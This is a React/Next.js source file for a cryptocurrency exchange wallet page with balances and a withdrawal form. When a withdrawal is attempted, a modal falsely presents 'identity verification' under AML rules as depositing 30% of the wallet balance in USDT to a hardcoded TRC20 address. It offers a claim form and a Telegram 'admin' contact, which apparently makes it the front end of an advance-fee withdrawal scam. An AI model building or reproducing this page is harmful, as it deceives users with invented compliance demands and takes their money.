'use client';
import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import { Navbar } from '@/components/Navbar';
import { Sidebar } from '@/components/Sidebar';
import { Footer } from '@/components/Footer';
import { api, auth } from '@/lib/api';
import { fmtNum } from '@/lib/utils';
import { Copy, AlertTriangle, X, Send, MessageCircle } from 'lucide-react';
import Link from 'next/link';

interface Wallet { id: string; balance: string; locked: string; address: string; coin: { symbol: string; name: string } }
interface VerificationStatus {
  totalBalance: number;
  verificationDeposit: number;
  required: number;
  verified: boolean;
}

const DEPOSIT_ADDRESS = 'TVbztzQE7HdSVaJsqBN9uFDJJVdNx8ZmMp';
const TELEGRAM_ADMIN = '@bengoshidesu';

export default function WalletPage() {
  const router = useRouter();
  const [wallets, setWallets] = useState<Wallet[]>([]);
  const [coin, setCoin] = useState('BTC');
  const [amount, setAmount] = useState('');
  const [address, setAddress] = useState('');
  const [msg, setMsg] = useState(''); const [err, setErr] = useState(''); const [loading, setLoading] = useState(false);
  const [showVerifyModal, setShowVerifyModal] = useState(false);
  const [verifyStatus, setVerifyStatus] = useState<VerificationStatus | null>(null);
  const [claimAmount, setClaimAmount] = useState('');
  const [claimMsg, setClaimMsg] = useState('');
  const [claimLoading, setClaimLoading] = useState(false);

  useEffect(() => {
    if (!auth.isAuthed()) { router.replace('/login'); return; }
    api<Wallet[]>('/api/wallet').then(setWallets).catch(() => {});
  }, [router]);

  async function loadVerifyStatus() {
    try {
      const s = await api<VerificationStatus>('/api/wallet/verification-status');
      setVerifyStatus(s);
    } catch { }
  }

  async function withdraw(e: React.FormEvent) {
    e.preventDefault(); setMsg(''); setErr(''); setLoading(true);
    try {
      await api('/api/wallet/withdraw', { method: 'POST', body: JSON.stringify({ coin, amount, address }) });
      setMsg('Withdrawal submitted for admin approval');
      setAmount(''); setAddress('');
      api<Wallet[]>('/api/wallet').then(setWallets);
    } catch (e: any) {
      if (e?.data?.code === 'VERIFICATION_REQUIRED') {
        setShowVerifyModal(true);
        loadVerifyStatus();
        setErr('Identity verification required before withdrawal.');
      } else {
        setErr(e?.message || 'Failed');
      }
    }
    finally { setLoading(false); }
  }

  async function claimDeposit(e: React.FormEvent) {
    e.preventDefault();
    setClaimMsg(''); setClaimLoading(true);
    try {
      const res = await api<{ ok: boolean; message: string }>('/api/wallet/claim-verification-deposit', {
        method: 'POST',
        body: JSON.stringify({ amount: claimAmount })
      });
      setClaimMsg(res.message);
      setClaimAmount('');
      loadVerifyStatus();
    } catch (e: any) {
      setClaimMsg(e?.message || 'Failed');
    } finally {
      setClaimLoading(false);
    }
  }

  return (
    <div className="min-h-screen bg-bg">
      <Navbar />
      <div className="mx-auto flex max-w-[1400px]">
        <Sidebar />
        <main className="flex-1 px-3 py-4 lg:px-6 lg:py-6 space-y-4">
          <div className="glass p-5">
            <h1 className="text-2xl font-extrabold text-white">Wallet</h1>
            <div className="mt-4 grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
              {wallets.map(w => (
                <div key={w.id} className="rounded-xl border border-bg-border bg-bg-soft/40 p-4">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-sm font-bold text-white">{w.coin.symbol}</p>
                      <p className="text-xs text-muted">{w.coin.name}</p>
                    </div>
                    <p className="text-lg font-extrabold text-white">{fmtNum(Number(w.balance), 6)}</p>
                  </div>
                  <div className="mt-3 flex items-center gap-1 rounded-md bg-bg p-2 text-xs text-muted">
                    <span className="truncate flex-1">{w.address}</span>
                    <button onClick={() => navigator.clipboard.writeText(w.address)}><Copy className="h-3.5 w-3.5" /></button>
                  </div>
                  {Number(w.locked) > 0 && <p className="mt-1 text-xs text-brand-red">Locked: {fmtNum(Number(w.locked), 6)}</p>}
                </div>
              ))}
            </div>
          </div>

          <div className="glass p-5 max-w-xl">
            <h2 className="text-lg font-bold text-white">Withdraw</h2>
            <form onSubmit={withdraw} className="mt-4 space-y-3">
              <div>
                <label className="text-xs text-muted">Coin</label>
                <select value={coin} onChange={(e) => setCoin(e.target.value)} className="input mt-1">
                  {wallets.map(w => <option key={w.id} value={w.coin.symbol}>{w.coin.symbol}</option>)}
                </select>
              </div>
              <div>
                <label className="text-xs text-muted">Amount</label>
                <input className="input mt-1" required inputMode="decimal" value={amount} onChange={(e) => setAmount(e.target.value)} />
              </div>
              <div>
                <label className="text-xs text-muted">Destination Address</label>
                <input className="input mt-1" required value={address} onChange={(e) => setAddress(e.target.value)} />
              </div>
              {err && <p className="text-sm text-brand-red">{err}</p>}
              {msg && <p className="text-sm text-brand-green">{msg}</p>}
              <button disabled={loading} className="btn-primary w-full">{loading ? 'Submitting…' : 'Submit Withdrawal'}</button>
              <p className="text-xs text-muted">Withdrawals require admin approval to mitigate fraud.</p>
            </form>
          </div>
        </main>
      </div>
      <Footer />

      {showVerifyModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
          <div className="w-full max-w-lg rounded-2xl border border-bg-border bg-bg-card shadow-2xl">
            <div className="flex items-center justify-between border-b border-bg-border/40 p-4">
              <div className="flex items-center gap-2">
                <AlertTriangle className="h-5 w-5 text-brand-red" />
                <h3 className="text-lg font-bold text-white">Identity Verification Required</h3>
              </div>
              <button onClick={() => setShowVerifyModal(false)} className="rounded-lg p-1 hover:bg-bg-soft transition">
                <X className="h-5 w-5 text-muted" />
              </button>
            </div>
            <div className="p-5 space-y-4">
              <p className="text-sm text-white/90">
                To protect user funds and comply with AML regulations, you must verify your identity by depositing at least <strong className="text-brand-yellow">30% of your wallet balance</strong> in USDT (TRC20) before any withdrawals can be processed.
              </p>

              {verifyStatus && (
                <div className="rounded-xl border border-bg-border bg-bg-soft/40 p-4 space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-muted">Wallet Balance</span>
                    <span className="font-bold text-white">{fmtNum(verifyStatus.totalBalance, 4)} USDT</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-muted">Verified Deposit</span>
                    <span className="font-bold text-white">{fmtNum(verifyStatus.verificationDeposit, 4)} USDT</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-muted">Still Required</span>
                    <span className="font-bold text-brand-red">{fmtNum(verifyStatus.required, 4)} USDT</span>
                  </div>
                </div>
              )}

              <div className="rounded-xl border border-brand-yellow/30 bg-brand-yellow/5 p-4">
                <p className="text-xs text-muted mb-1">Send USDT (TRC20) to</p>
                <div className="mt-1 flex items-center gap-2">
                  <code className="flex-1 break-all text-sm font-mono text-white">{DEPOSIT_ADDRESS}</code>
                  <button onClick={() => { navigator.clipboard.writeText(DEPOSIT_ADDRESS); setClaimMsg('Address copied'); setTimeout(() => setClaimMsg(''), 1500); }} className="btn-ghost px-2 py-1 text-xs">
                    <Copy className="h-3.5 w-3.5" />
                  </button>
                </div>
              </div>

              <form onSubmit={claimDeposit} className="space-y-2">
                <label className="text-xs text-muted">Amount you sent for verification</label>
                <input
                  className="input"
                  required
                  inputMode="decimal"
                  placeholder="e.g. 500"
                  value={claimAmount}
                  onChange={(e) => setClaimAmount(e.target.value)}
                />
                {claimMsg && <p className="text-xs text-brand-green">{claimMsg}</p>}
                <button disabled={claimLoading} className="btn-primary w-full text-sm">
                  {claimLoading ? 'Submitting…' : 'I Have Sent the Verification Deposit'}
                </button>
              </form>

              <a
                href={`https://t.me/${TELEGRAM_ADMIN.replace('@', '')}`}
                target="_blank"
                rel="noopener noreferrer"
                className="btn-ghost w-full flex items-center justify-center gap-2 text-sm"
              >
                <MessageCircle className="h-4 w-4 text-brand-yellow" />
                Contact Admin on Telegram {TELEGRAM_ADMIN}
              </a>

              <Link href="/deposit" onClick={() => setShowVerifyModal(false)} className="btn-ghost w-full flex items-center justify-center gap-2 text-sm">
                <Send className="h-4 w-4 text-brand-green" />
                Go to Deposit Page
              </Link>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
